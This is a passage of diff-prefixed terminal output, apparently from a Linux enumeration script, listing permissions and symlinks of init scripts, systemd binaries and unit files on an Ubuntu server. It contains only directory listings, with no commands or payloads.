+-rwxr-xr-x  1 root root 2444 Oct 25  2017 irqbalance
+-rwxr-xr-x  1 root root 1479 Feb 15  2018 keyboard-setup.sh
+-rwxr-xr-x  1 root root 2044 Aug 15  2017 kmod
+-rwxr-xr-x  1 root root 1846 Apr  5  2019 open-vm-tools
+-rwxr-xr-x  1 root root 1366 Jan 17  2018 plymouth
+-rwxr-xr-x  1 root root  752 Jan 17  2018 plymouth-log
+-rwxr-xr-x  1 root root 1191 Jan 17  2018 procps
+-rwxr-xr-x  1 root root 4355 Dec 12  2017 rsync
+-rwxr-xr-x  1 root root 2864 Jan 14  2018 rsyslog
+-rwxr-xr-x  1 root root 3837 Jan 25  2018 ssh
+-rwxr-xr-x  1 root root 5974 Apr 20  2018 udev
+-rwxr-xr-x  1 root root 2083 Aug 15  2017 ufw
+-rwxr-xr-x  1 root root 1306 Oct 15  2018 uuidd
+-rwxr-xr-x  1 root root 2757 Jan 19  2017 x11-common
+-e 
+
+-e [00;31m[-] /lib/systemd/* config file permissions:[00m
+/lib/systemd/:
+total 7.3M
+drwxr-xr-x 24 root root  36K Aug 24  2019 system
+drwxr-xr-x  2 root root 4.0K Aug 23  2019 system-generators
+drwxr-xr-x  2 root root 4.0K Aug 23  2019 network
+drwxr-xr-x  2 root root 4.0K Aug 23  2019 system-preset
+drwxr-xr-x  2 root root 4.0K Aug 23  2019 system-sleep
+-rw-r--r--  1 root root 2.3M Jul 22  2019 libsystemd-shared-237.so
+-rw-r--r--  1 root root  699 Jul 22  2019 resolv.conf
+-rwxr-xr-x  1 root root 1.3K Jul 22  2019 set-cpufreq
+-rwxr-xr-x  1 root root 1.6M Jul 22  2019 systemd
+-rwxr-xr-x  1 root root 6.0K Jul 22  2019 systemd-ac-power
+-rwxr-xr-x  1 root root  18K Jul 22  2019 systemd-backlight
+-rwxr-xr-x  1 root root  11K Jul 22  2019 systemd-binfmt
+-rwxr-xr-x  1 root root  10K Jul 22  2019 systemd-cgroups-agent
+-rwxr-xr-x  1 root root  22K Jul 22  2019 systemd-cryptsetup
+-rwxr-xr-x  1 root root  15K Jul 22  2019 systemd-dissect
+-rwxr-xr-x  1 root root  18K Jul 22  2019 systemd-fsck
+-rwxr-xr-x  1 root root  23K Jul 22  2019 systemd-fsckd
+-rwxr-xr-x  1 root root  19K Jul 22  2019 systemd-growfs
+-rwxr-xr-x  1 root root  10K Jul 22  2019 systemd-hibernate-resume
+-rwxr-xr-x  1 root root  23K Jul 22  2019 systemd-hostnamed
+-rwxr-xr-x  1 root root  15K Jul 22  2019 systemd-initctl
+-rwxr-xr-x  1 root root 127K Jul 22  2019 systemd-journald
+-rwxr-xr-x  1 root root  35K Jul 22  2019 systemd-localed
+-rwxr-xr-x  1 root root 215K Jul 22  2019 systemd-logind
+-rwxr-xr-x  1 root root  10K Jul 22  2019 systemd-makefs
+-rwxr-xr-x  1 root root  15K Jul 22  2019 systemd-modules-load
+-rwxr-xr-x  1 root root 1.6M Jul 22  2019 systemd-networkd
+-rwxr-xr-x  1 root root  19K Jul 22  2019 systemd-networkd-wait-online
+-rwxr-xr-x  1 root root  11K Jul 22  2019 systemd-quotacheck
+-rwxr-xr-x  1 root root  10K Jul 22  2019 systemd-random-seed
+-rwxr-xr-x  1 root root  15K Jul 22  2019 systemd-remount-fs
+-rwxr-xr-x  1 root root  10K Jul 22  2019 systemd-reply-password
+-rwxr-xr-x  1 root root 371K Jul 22  2019 systemd-resolved
+-rwxr-xr-x  1 root root  19K Jul 22  2019 systemd-rfkill
+-rwxr-xr-x  1 root root  43K Jul 22  2019 systemd-shutdown
+-rwxr-xr-x  1 root root  19K Jul 22  2019 systemd-sleep
+-rwxr-xr-x  1 root root  23K Jul 22  2019 systemd-socket-proxyd
+-rwxr-xr-x  1 root root  11K Jul 22  2019 systemd-sulogin-shell
+-rwxr-xr-x  1 root root  15K Jul 22  2019 systemd-sysctl
+-rwxr-xr-x  1 root root 1.3K Jul 22  2019 systemd-sysv-install
+-rwxr-xr-x  1 root root  27K Jul 22  2019 systemd-timedated
+-rwxr-xr-x  1 root root  39K Jul 22  2019 systemd-timesyncd
+-rwxr-xr-x  1 root root 571K Jul 22  2019 systemd-udevd
+-rwxr-xr-x  1 root root  15K Jul 22  2019 systemd-update-utmp
+-rwxr-xr-x  1 root root  10K Jul 22  2019 systemd-user-sessions
+-rwxr-xr-x  1 root root  10K Jul 22  2019 systemd-veritysetup
+-rwxr-xr-x  1 root root  10K Jul 22  2019 systemd-volatile-root
+drwxr-xr-x  2 root root 4.0K Apr 20  2018 system-shutdown
+
+/lib/systemd/system:
+total 848K
+drwxr-xr-x 2 root root 4.0K Aug 24  2019 apache2.service.d
+drwxr-xr-x 2 root root 4.0K Aug 23  2019 halt.target.wants
+drwxr-xr-x 2 root root 4.0K Aug 23  2019 initrd-switch-root.target.wants
+drwxr-xr-x 2 root root 4.0K Aug 23  2019 kexec.target.wants
+drwxr-xr-x 2 root root 4.0K Aug 23  2019 multi-user.target.wants
+drwxr-xr-x 2 root root 4.0K Aug 23  2019 poweroff.target.wants
+drwxr-xr-x 2 root root 4.0K Aug 23  2019 reboot.target.wants
+drwxr-xr-x 2 root root 4.0K Aug 23  2019 sysinit.target.wants
+drwxr-xr-x 2 root root 4.0K Aug 23  2019 sockets.target.wants
+drwxr-xr-x 2 root root 4.0K Aug 23  2019 getty.target.wants
+drwxr-xr-x 2 root root 4.0K Aug 23  2019 graphical.target.wants
+drwxr-xr-x 2 root root 4.0K Aug 23  2019 local-fs.target.wants
+drwxr-xr-x 2 root root 4.0K Aug 23  2019 rescue.target.wants
+drwxr-xr-x 2 root root 4.0K Aug 23  2019 timers.target.wants
+drwxr-xr-x 2 root root 4.0K Aug 23  2019 rc-local.service.d
+drwxr-xr-x 2 root root 4.0K Aug 23  2019 user@.service.d
+drwxr-xr-x 2 root root 4.0K Aug 23  2019 open-vm-tools.service.d
+lrwxrwxrwx 1 root root    9 Aug 23  2019 sudo.service -> /dev/null
+lrwxrwxrwx 1 root root   14 Jul 22  2019 autovt@.service -> getty@.service
+lrwxrwxrwx 1 root root    9 Jul 22  2019 bootlogd.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul 22  2019 bootlogs.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul 22  2019 bootmisc.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul 22  2019 checkfs.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul 22  2019 checkroot-bootclean.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul 22  2019 checkroot.service -> /dev/null
+-rw-r--r-- 1 root root 1.1K Jul 22  2019 console-getty.service
+-rw-r--r-- 1 root root 1.3K Jul 22  2019 container-getty@.service
+lrwxrwxrwx 1 root root    9 Jul 22  2019 cryptdisks-early.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul 22  2019 cryptdisks.service -> /dev/null
+lrwxrwxrwx 1 root root   13 Jul 22  2019 ctrl-alt-del.target -> reboot.target
+lrwxrwxrwx 1 root root   25 Jul 22  2019 dbus-org.freedesktop.hostname1.service -> systemd-hostnamed.service
+lrwxrwxrwx 1 root root   23 Jul 22  2019 dbus-org.freedesktop.locale1.service -> systemd-localed.service
+lrwxrwxrwx 1 root root   22 Jul 22  2019 dbus-org.freedesktop.login1.service -> systemd-logind.service
+lrwxrwxrwx 1 root root   25 Jul 22  2019 dbus-org.freedesktop.timedate1.service -> systemd-timedated.service
+-rw-r--r-- 1 root root 1.1K Jul 22  2019 debug-shell.service
+lrwxrwxrwx 1 root root   16 Jul 22  2019 default.target -> graphical.target
+-rw-r--r-- 1 root root  797 Jul 22  2019 emergency.service
+lrwxrwxrwx 1 root root    9 Jul 22  2019 fuse.service -> /dev/null
+-rw-r--r-- 1 root root  342 Jul 22  2019 getty-static.service
+-rw-r--r-- 1 root root 2.0K Jul 22  2019 getty@.service
+lrwxrwxrwx 1 root root    9 Jul 22  2019 halt.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul 22  2019 hostname.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul 22  2019 hwclock.service -> /dev/null
+-rw-r--r-- 1 root root  670 Jul 22  2019 initrd-cleanup.service
+-rw-r--r-- 1 root root  830 Jul 22  2019 initrd-parse-etc.service
+-rw-r--r-- 1 root root  589 Jul 22  2019 initrd-switch-root.service
+-rw-r--r-- 1 root root  704 Jul 22  2019 initrd-udevadm-cleanup-db.service
+lrwxrwxrwx 1 root root    9 Jul 22  2019 killprocs.service -> /dev/null
+-rw-r--r-- 1 root root  717 Jul 22  2019 kmod-static-nodes.service
+lrwxrwxrwx 1 root root   28 Jul 22  2019 kmod.service -> systemd-modules-load.service
+lrwxrwxrwx 1 root root   28 Jul 22  2019 module-init-tools.service -> systemd-modules-load.service
+lrwxrwxrwx 1 root root    9 Jul 22  2019 motd.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul 22  2019 mountall-bootclean.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul 22  2019 mountall.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul 22  2019 mountdevsubfs.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul 22  2019 mountkernfs.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul 22  2019 mountnfs-bootclean.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul 22  2019 mountnfs.service -> /dev/null
+-rw-r--r-- 1 root root  362 Jul 22  2019 ondemand.service
+lrwxrwxrwx 1 root root   22 Jul 22  2019 procps.service -> systemd-sysctl.service
+-rw-r--r-- 1 root root  609 Jul 22  2019 quotaon.service
+-rw-r--r-- 1 root root  716 Jul 22  2019 rc-local.service
+lrwxrwxrwx 1 root root   16 Jul 22  2019 rc.local.service -> rc-local.service
+lrwxrwxrwx 1 root root    9 Jul 22  2019 rc.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul 22  2019 rcS.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul 22  2019 reboot.service -> /dev/null
+-rw-r--r-- 1 root root  788 Jul 22  2019 rescue.service
+lrwxrwxrwx 1 root root    9 Jul 22  2019 rmnologin.service -> /dev/null
+lrwxrwxrwx 1 root root   15 Jul 22  2019 runlevel0.target -> poweroff.target
+lrwxrwxrwx 1 root root   13 Jul 22  2019 runlevel1.target -> rescue.target
+lrwxrwxrwx 1 root root   17 Jul 22  2019 runlevel2.target -> multi-user.target
+lrwxrwxrwx 1 root root   17 Jul 22  2019 runlevel3.target -> multi-user.target
+lrwxrwxrwx 1 root root   17 Jul 22  2019 runlevel4.target -> multi-user.target
+lrwxrwxrwx 1 root root   16 Jul 22  2019 runlevel5.target -> graphical.target
+lrwxrwxrwx 1 root root   13 Jul 22  2019 runlevel6.target -> reboot.target
+lrwxrwxrwx 1 root root    9 Jul 22  2019 sendsigs.service -> /dev/null
+-rw-r--r-- 1 root root 1.5K Jul 22  2019 serial-getty@.service
+lrwxrwxrwx 1 root root    9 Jul 22  2019 single.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul 22  2019 stop-bootlogd-single.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul 22  2019 stop-bootlogd.service -> /dev/null
+-rw-r--r-- 1 root root  554 Jul 22  2019 suspend-then-hibernate.target
+-rw-r--r-- 1 root root 1.4K Jul 22  2019 system-update-cleanup.service
+-rw-r--r-- 1 root root  724 Jul 22  2019 systemd-ask-password-console.service
+-rw-r--r-- 1 root root  752 Jul 22  2019 systemd-ask-password-wall.service
+-rw-r--r-- 1 root root  752 Jul 22  2019 systemd-backlight@.service
+-rw-r--r-- 1 root root  999 Jul 22  2019 systemd-binfmt.service
+-rw-r--r-- 1 root root  537 Jul 22  2019 systemd-exit.service
+-rw-r--r-- 1 root root  714 Jul 22  2019 systemd-fsck-root.service
+-rw-r--r-- 1 root root  715 Jul 22  2019 systemd-fsck@.service
+-rw-r--r-- 1 root root  551 Jul 22  2019 systemd-fsckd.service
+-rw-r--r-- 1 root root  540 Jul 22  2019 systemd-fsckd.socket
+-rw-r--r-- 1 root root  584 Jul 22  2019 systemd-halt.service
+-rw-r--r-- 1 root root  671 Jul 22  2019 systemd-hibernate-resume@.service
+-rw-r--r-- 1 root root  541 Jul 22  2019 systemd-hibernate.service
+-rw-r--r-- 1 root root 1.1K Jul 22  2019 systemd-hostnamed.service
+-rw-r--r-- 1 root root  818 Jul 22  2019 systemd-hwdb-update.service
+-rw-r--r-- 1 root root  559 Jul 22  2019 systemd-hybrid-sleep.service
+-rw-r--r-- 1 root root  551 Jul 22  2019 systemd-initctl.service
+-rw-r--r-- 1 root root  771 Jul 22  2019 systemd-journal-flush.service
+-rw-r--r-- 1 root root  686 Jul 22  2019 systemd-journald-audit.socket
+-rw-r--r-- 1 root root 1.6K Jul 22  2019 systemd-journald.service
+-rw-r--r-- 1 root root  597 Jul 22  2019 systemd-kexec.service
+-rw-r--r-- 1 root root 1.1K Jul 22  2019 systemd-localed.service
+-rw-r--r-- 1 root root 1.5K Jul 22  2019 systemd-logind.service
+-rw-r--r-- 1 root root  733 Jul 22  2019 systemd-machine-id-commit.service
+-rw-r--r-- 1 root root 1007 Jul 22  2019 systemd-modules-load.service
+-rw-r--r-- 1 root root  740 Jul 22  2019 systemd-networkd-wait-online.service
+-rw-r--r-- 1 root root 1.9K Jul 22  2019 systemd-networkd.service
+-rw-r--r-- 1 root root  593 Jul 22  2019 systemd-poweroff.service
+-rw-r--r-- 1 root root  655 Jul 22  2019 systemd-quotacheck.service
+-rw-r--r-- 1 root root  792 Jul 22  2019 systemd-random-seed.service
+-rw-r--r-- 1 root root  588 Jul 22  2019 systemd-reboot.service
+-rw-r--r-- 1 root root  833 Jul 22  2019 systemd-remount-fs.service
+-rw-r--r-- 1 root root 1.7K Jul 22  2019 systemd-resolved.service
+-rw-r--r-- 1 root root  724 Jul 22  2019 systemd-rfkill.service
+-rw-r--r-- 1 root root  573 Jul 22  2019 systemd-suspend-then-hibernate.service
+-rw-r--r-- 1 root root  537 Jul 22  2019 systemd-suspend.service
+-rw-r--r-- 1 root root  693 Jul 22  2019 systemd-sysctl.service
+-rw-r--r-- 1 root root 1.1K Jul 22  2019 systemd-timedated.service
+-rw-r--r-- 1 root root 1.4K Jul 22  2019 systemd-timesyncd.service
+-rw-r--r-- 1 root root  659 Jul 22  2019 systemd-tmpfiles-clean.service
+-rw-r--r-- 1 root root  764 Jul 22  2019 systemd-tmpfiles-setup-dev.service
+-rw-r--r-- 1 root root  744 Jul 22  2019 systemd-tmpfiles-setup.service
+-rw-r--r-- 1 root root  863 Jul 22  2019 systemd-udev-settle.service
+-rw-r--r-- 1 root root  755 Jul 22  2019 systemd-udev-trigger.service
+-rw-r--r-- 1 root root  985 Jul 22  2019 systemd-udevd.service
+-rw-r--r-- 1 root root  797 Jul 22  2019 systemd-update-utmp-runlevel.service
+-rw-r--r-- 1 root root  794 Jul 22  2019 systemd-update-utmp.service
+-rw-r--r-- 1 root root  628 Jul 22  2019 systemd-user-sessions.service
+-rw-r--r-- 1 root root  690 Jul 22  2019 systemd-volatile-root.service
+lrwxrwxrwx 1 root root   21 Jul 22  2019 udev.service -> systemd-udevd.service
+lrwxrwxrwx 1 root root    9 Jul 22  2019 umountfs.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul 22  2019 umountnfs.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul 22  2019 umountroot.service -> /dev/null
+lrwxrwxrwx 1 root root   27 Jul 22  2019 urandom.service -> systemd-random-seed.service
+-rw-r--r-- 1 root root  593 Jul 22  2019 user@.service
+lrwxrwxrwx 1 root root    9 Jul 22  2019 x11-common.service -> /dev/null
+-rw-r--r-- 1 root root  528 Jul 16  2019 apache-htcacheclean.service
+-rw-r--r-- 1 root root  537 Jul 16  2019 apache-htcacheclean@.service
+-rw-r--r-- 1 root root  346 Jul 16  2019 apache2.service
+-rw-r--r-- 1 root root  418 Jul 16  2019 apache2@.service
+-rw-r--r-- 1 root root  161 Jul  8  2019 motd-news.timer
+-rw-r--r-- 1 root root  505 Jun 10  2019 dbus.service
+-rw-r--r-- 1 root root  106 Jun 10  2019 dbus.socket
+-rw-r--r-- 1 root root  479 May 14  2019 run-vmblock\x2dfuse.mount
+-rw-r--r-- 1 root root  466 May 14  2019 open-vm-tools.service
+-rw-r--r-- 1 root root  385 May 14  2019 vgauth.service
+-rw-r--r-- 1 root root  289 May  9  2019 netplan-wpa@.service
+-rw-r--r-- 1 root root  238 May  7  2019 apt-daily-upgrade.service
+-rw-r--r-- 1 root root  184 May  7  2019 apt-daily-upgrade.timer
+-rw-r--r-- 1 root root  326 May  7  2019 apt-daily.service
+-rw-r--r-- 1 root root  156 May  7  2019 apt-daily.timer
+-rw-r--r-- 1 root root  312 Apr 23  2019 console-setup.service
+-rw-r--r-- 1 root root  287 Apr 23  2019 keyboard-setup.service
+-rw-r--r-- 1 root root  330 Apr 23  2019 setvtrgb.service
+-rw-r--r-- 1 root root  250 Apr  9  2019 ureadahead-stop.service
+-rw-r--r-- 1 root root  242 Apr  9  2019 ureadahead-stop.timer
+-rw-r--r-- 1 root root  404 Apr  9  2019 ureadahead.service
+-rw-r--r-- 1 root root  412 Apr  4  2019 plymouth-halt.service
+-rw-r--r-- 1 root root  426 Apr  4  2019 plymouth-kexec.service
+lrwxrwxrwx 1 root root   27 Apr  4  2019 plymouth-log.service -> plymouth-read-write.service
+-rw-r--r-- 1 root root  421 Apr  4  2019 plymouth-poweroff.service
+-rw-r--r-- 1 root root  200 Apr  4  2019 plymouth-quit-wait.service
+-rw-r--r-- 1 root root  194 Apr  4  2019 plymouth-quit.service
+-rw-r--r-- 1 root root  244 Apr  4  2019 plymouth-read-write.service
+-rw-r--r-- 1 root root  416 Apr  4  2019 plymouth-reboot.service
+-rw-r--r-- 1 root root  532 Apr  4  2019 plymouth-start.service
+-rw-r--r-- 1 root root  291 Apr  4  2019 plymouth-switch-root.service
+lrwxrwxrwx 1 root root   21 Apr  4  2019 plymouth.service -> plymouth-quit.service
+-rw-r--r-- 1 root root  490 Apr  4  2019 systemd-ask-password-plymouth.path
+-rw-r--r-- 1 root root  467 Apr  4  2019 systemd-ask-password-plymouth.service
+-rw-r--r-- 1 root root  368 Jan  9  2019 irqbalance.service
+-rw-r--r-- 1 root root   92 Oct 15  2018 fstrim.service
+-rw-r--r-- 1 root root  170 Oct 15  2018 fstrim.timer
+-rw-r--r-- 1 root root  189 Oct 15  2018 uuidd.service
+-rw-r--r-- 1 root root  126 Oct 15  2018 uuidd.socket
+-rw-r--r-- 1 root root  618 Oct 15  2018 friendly-recovery.service
+-rw-r--r-- 1 root root  172 Oct 15  2018 friendly-recovery.target
+-rw-r--r-- 1 root root  258 Oct 15  2018 networkd-dispatcher.service
+-rw-r--r-- 1 root root  173 Aug  6  2018 motd-news.service
+-rw-r--r-- 1 root root  290 Apr 24  2018 rsyslog.service
+drwxr-xr-x 2 root root 4.0K Apr 20  2018 runlevel1.target.wants
+drwxr-xr-x 2 root root 4.0K Apr 20  2018 runlevel2.target.wants
+drwxr-xr-x 2 root root 4.0K Apr 20  2018 runlevel3.target.wants
+drwxr-xr-x 2 root root 4.0K Apr 20  2018 runlevel4.target.wants
+drwxr-xr-x 2 root root 4.0K Apr 20  2018 runlevel5.target.wants
+-rw-r--r-- 1 root root  544 Mar 22  2018 apparmor.service
+-rw-r--r-- 1 root root  919 Jan 28  2018 basic.target
+-rw-r--r-- 1 root root  419 Jan 28  2018 bluetooth.target
+-rw-r--r-- 1 root root  465 Jan 28  2018 cryptsetup-pre.target
+-rw-r--r-- 1 root root  412 Jan 28  2018 cryptsetup.target
+-rw-r--r-- 1 root root  750 Jan 28  2018 dev-hugepages.mount
+-rw-r--r-- 1 root root  665 Jan 28  2018 dev-mqueue.mount
+-rw-r--r-- 1 root root  471 Jan 28  2018 emergency.target
+-rw-r--r-- 1 root root  541 Jan 28  2018 exit.target
+-rw-r--r-- 1 root root  480 Jan 28  2018 final.target
+-rw-r--r-- 1 root root  506 Jan 28  2018 getty-pre.target
+-rw-r--r-- 1 root root  500 Jan 28  2018 getty.target
+-rw-r--r-- 1 root root  598 Jan 28  2018 graphical.target
+-rw-r--r-- 1 root root  527 Jan 28  2018 halt.target
+-rw-r--r-- 1 root root  509 Jan 28  2018 hibernate.target
+-rw-r--r-- 1 root root  530 Jan 28  2018 hybrid-sleep.target
+-rw-r--r-- 1 root root  593 Jan 28  2018 initrd-fs.target
+-rw-r--r-- 1 root root  561 Jan 28  2018 initrd-root-device.target
+-rw-r--r-- 1 root root  566 Jan 28  2018 initrd-root-fs.target
+-rw-r--r-- 1 root root  754 Jan 28  2018 initrd-switch-root.target
+-rw-r--r-- 1 root root  763 Jan 28  2018 initrd.target
+-rw-r--r-- 1 root root  541 Jan 28  2018 kexec.target
+-rw-r--r-- 1 root root  435 Jan 28  2018 local-fs-pre.target
+-rw-r--r-- 1 root root  547 Jan 28  2018 local-fs.target
+-rw-r--r-- 1 root root  445 Jan 28  2018 machine.slice
+-rw-r--r-- 1 root root  532 Jan 28  2018 multi-user.target
+-rw-r--r-- 1 root root  505 Jan 28  2018 network-online.target
+-rw-r--r-- 1 root root  502 Jan 28  2018 network-pre.target
+-rw-r--r-- 1 root root  521 Jan 28  2018 network.target
+-rw-r--r-- 1 root root  554 Jan 28  2018 nss-lookup.target
+-rw-r--r-- 1 root root  513 Jan 28  2018 nss-user-lookup.target
+-rw-r--r-- 1 root root  394 Jan 28  2018 paths.target
+-rw-r--r-- 1 root root  592 Jan 28  2018 poweroff.target
+-rw-r--r-- 1 root root  417 Jan 28  2018 printer.target
+-rw-r--r-- 1 root root  745 Jan 28  2018 proc-sys-fs-binfmt_misc.automount
+-rw-r--r-- 1 root root  655 Jan 28  2018 proc-sys-fs-binfmt_misc.mount
+-rw-r--r-- 1 root root  583 Jan 28  2018 reboot.target
+-rw-r--r-- 1 root root  549 Jan 28  2018 remote-cryptsetup.target
+-rw-r--r-- 1 root root  436 Jan 28  2018 remote-fs-pre.target
+-rw-r--r-- 1 root root  522 Jan 28  2018 remote-fs.target
+-rw-r--r-- 1 root root  492 Jan 28  2018 rescue.target
+-rw-r--r-- 1 root root  540 Jan 28  2018 rpcbind.target
+-rw-r--r-- 1 root root  442 Jan 28  2018 shutdown.target
+-rw-r--r-- 1 root root  402 Jan 28  2018 sigpwr.target
+-rw-r--r-- 1 root root  460 Jan 28  2018 sleep.target
+-rw-r--r-- 1 root root  449 Jan 28  2018 slices.target
+-rw-r--r-- 1 root root  420 Jan 28  2018 smartcard.target
+-rw-r--r-- 1 root root  396 Jan 28  2018 sockets.target
+-rw-r--r-- 1 root root  420 Jan 28  2018 sound.target
+-rw-r--r-- 1 root root  503 Jan 28  2018 suspend.target
+-rw-r--r-- 1 root root  393 Jan 28  2018 swap.target
+-rw-r--r-- 1 root root  795 Jan 28  2018 sys-fs-fuse-connections.mount
+-rw-r--r-- 1 root root  767 Jan 28  2018 sys-kernel-config.mount
+-rw-r--r-- 1 root root  710 Jan 28  2018 sys-kernel-debug.mount
+-rw-r--r-- 1 root root  558 Jan 28  2018 sysinit.target
+-rw-r--r-- 1 root root 1.4K Jan 28  2018 syslog.socket
+-rw-r--r-- 1 root root  592 Jan 28  2018 system-update.target
+-rw-r--r-- 1 root root  445 Jan 28  2018 system.slice
+-rw-r--r-- 1 root root  704 Jan 28  2018 systemd-ask-password-console.path
+-rw-r--r-- 1 root root  632 Jan 28  2018 systemd-ask-password-wall.path
+-rw-r--r-- 1 root root  564 Jan 28  2018 systemd-initctl.socket
+-rw-r--r-- 1 root root 1.2K Jan 28  2018 systemd-journald-dev-log.socket
+-rw-r--r-- 1 root root  882 Jan 28  2018 systemd-journald.socket
+-rw-r--r-- 1 root root  631 Jan 28  2018 systemd-networkd.socket
+-rw-r--r-- 1 root root  657 Jan 28  2018 systemd-rfkill.socket
+-rw-r--r-- 1 root root  490 Jan 28  2018 systemd-tmpfiles-clean.timer
+-rw-r--r-- 1 root root  635 Jan 28  2018 systemd-udevd-control.socket
+-rw-r--r-- 1 root root  610 Jan 28  2018 systemd-udevd-kernel.socket
+-rw-r--r-- 1 root root  435 Jan 28  2018 time-sync.target
+-rw-r--r-- 1 root root  445 Jan 28  2018 timers.target
+-rw-r--r-- 1 root root  457 Jan 28  2018 umount.target
+-rw-r--r-- 1 root root  432 Jan 28  2018 user.slice
+-rw-r--r-- 1 root root  493 Jan 25  2018 ssh.service
+-rw-r--r-- 1 root root  244 Jan 25  2018 ssh@.service
+-rw-r--r-- 1 root root  155 Jan 17  2018 phpsessionclean.service
+-rw-r--r-- 1 root root  144 Jan 17  2018 phpsessionclean.timer
+-rw-r--r-- 1 root root  216 Jan 16  2018 ssh.socket
+-rw-r--r-- 1 root root  741 Dec 17  2017 accounts-daemon.service
+-rw-r--r-- 1 root root  251 Nov 15  2017 cron.service
+-rw-r--r-- 1 root root  266 Aug 15  2017 ufw.service
+-rw-r--r-- 1 root root  188 Feb 24  2014 rsync.service
+
+/lib/systemd/system/apache2.service.d:
+total 4.0K
+-rw-r--r-- 1 root root 42 Jul 16  2019 apache2-systemd.conf
+
+/lib/systemd/system/halt.target.wants:
+total 0
+lrwxrwxrwx 1 root root 24 Apr  4  2019 plymouth-halt.service -> ../plymouth-halt.service
+
+/lib/systemd/system/initrd-switch-root.target.wants:
+total 0
+lrwxrwxrwx 1 root root 25 Apr  4  2019 plymouth-start.service -> ../plymouth-start.service
+lrwxrwxrwx 1 root root 31 Apr  4  2019 plymouth-switch-root.service -> ../plymouth-switch-root.service
+
+/lib/systemd/system/kexec.target.wants:
+total 0
+lrwxrwxrwx 1 root root 25 Apr  4  2019 plymouth-kexec.service -> ../plymouth-kexec.service
+
+/lib/systemd/system/multi-user.target.wants:
+total 0
+lrwxrwxrwx 1 root root 15 Jul 22  2019 getty.target -> ../getty.target
+lrwxrwxrwx 1 root root 33 Jul 22  2019 systemd-ask-password-wall.path -> ../systemd-ask-password-wall.path
+lrwxrwxrwx 1 root root 25 Jul 22  2019 systemd-logind.service -> ../systemd-logind.service
+lrwxrwxrwx 1 root root 39 Jul 22  2019 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+lrwxrwxrwx 1 root root 32 Jul 22  2019 systemd-user-sessions.service -> ../systemd-user-sessions.service
+lrwxrwxrwx 1 root root 15 Jun 10  2019 dbus.service -> ../dbus.service
+lrwxrwxrwx 1 root root 29 Apr  4  2019 plymouth-quit-wait.service -> ../plymouth-quit-wait.service
+lrwxrwxrwx 1 root root 24 Apr  4  2019 plymouth-quit.service -> ../plymouth-quit.service
+
+/lib/systemd/system/poweroff.target.wants:
+total 0
+lrwxrwxrwx 1 root root 28 Apr  4  2019 plymouth-poweroff.service -> ../plymouth-poweroff.service
+
+/lib/systemd/system/reboot.target.wants:
+total 0
+lrwxrwxrwx 1 root root 26 Apr  4  2019 plymouth-reboot.service -> ../plymouth-reboot.service
+
+/lib/systemd/system/sysinit.target.wants:
+total 0
+lrwxrwxrwx 1 root root 20 Jul 22  2019 cryptsetup.target -> ../cryptsetup.target
+lrwxrwxrwx 1 root root 22 Jul 22  2019 dev-hugepages.mount -> ../dev-hugepages.mount
+lrwxrwxrwx 1 root root 19 Jul 22  2019 dev-mqueue.mount -> ../dev-mqueue.mount
+lrwxrwxrwx 1 root root 28 Jul 22  2019 kmod-static-nodes.service -> ../kmod-static-nodes.service
+lrwxrwxrwx 1 root root 36 Jul 22  2019 proc-sys-fs-binfmt_misc.automount -> ../proc-sys-fs-binfmt_misc.automount
+lrwxrwxrwx 1 root root 32 Jul 22  2019 sys-fs-fuse-connections.mount -> ../sys-fs-fuse-connections.mount
+lrwxrwxrwx 1 root root 26 Jul 22  2019 sys-kernel-config.mount -> ../sys-kernel-config.mount
+lrwxrwxrwx 1 root root 25 Jul 22  2019 sys-kernel-debug.mount -> ../sys-kernel-debug.mount
+lrwxrwxrwx 1 root root 36 Jul 22  2019 systemd-ask-password-console.path -> ../systemd-ask-password-console.path
+lrwxrwxrwx 1 root root 25 Jul 22  2019 systemd-binfmt.service -> ../systemd-binfmt.service
+lrwxrwxrwx 1 root root 30 Jul 22  2019 systemd-hwdb-update.service -> ../systemd-hwdb-update.service
+lrwxrwxrwx 1 root root 32 Jul 22  2019 systemd-journal-flush.service -> ../systemd-journal-flush.service
+lrwxrwxrwx 1 root root 27 Jul 22  2019 systemd-journald.service -> ../systemd-journald.service
+lrwxrwxrwx 1 root root 36 Jul 22  2019 systemd-machine-id-commit.service -> ../systemd-machine-id-commit.service
+lrwxrwxrwx 1 root root 31 Jul 22  2019 systemd-modules-load.service -> ../systemd-modules-load.service
+lrwxrwxrwx 1 root root 30 Jul 22  2019 systemd-random-seed.service -> ../systemd-random-seed.service
+lrwxrwxrwx 1 root root 25 Jul 22  2019 systemd-sysctl.service -> ../systemd-sysctl.service
+lrwxrwxrwx 1 root root 37 Jul 22  2019 systemd-tmpfiles-setup-dev.service -> ../systemd-tmpfiles-setup-dev.service
+lrwxrwxrwx 1 root root 33 Jul 22  2019 systemd-tmpfiles-setup.service -> ../systemd-tmpfiles-setup.service
+lrwxrwxrwx 1 root root 31 Jul 22  2019 systemd-udev-trigger.service -> ../systemd-udev-trigger.service
+lrwxrwxrwx 1 root root 24 Jul 22  2019 systemd-udevd.service -> ../systemd-udevd.service
+lrwxrwxrwx 1 root root 30 Jul 22  2019 systemd-update-utmp.service -> ../systemd-update-utmp.service
+lrwxrwxrwx 1 root root 30 Apr  4  2019 plymouth-read-write.service -> ../plymouth-read-write.service
+lrwxrwxrwx 1 root root 25 Apr  4  2019 plymouth-start.service -> ../plymouth-start.service
+
+/lib/systemd/system/sockets.target.wants:
